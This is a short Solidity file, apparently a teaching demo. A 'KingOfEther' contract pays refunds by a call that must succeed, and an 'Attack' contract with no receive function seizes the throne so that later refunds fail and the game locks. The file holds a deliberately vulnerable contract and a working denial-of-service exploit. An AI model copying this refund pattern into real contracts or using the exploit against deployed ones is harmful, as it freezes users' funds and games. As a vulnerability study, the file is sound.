// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract KingOfEther
{
    address public king;
    uint public balance;

    function claimThrone() external payable
    {
        require(msg.value > balance, "Need to pay more ether to become king");
        (bool sent,) = king.call{value: balance}("");
        require(sent, "Failed to send ether");
        balance = msg.value;
        king = msg.sender;
    }
}
contract Attack
{
    function attack (KingOfEther kingOfEther) public payable
    {
        kingOfEther.claimThrone{value: msg.value}();
    }
}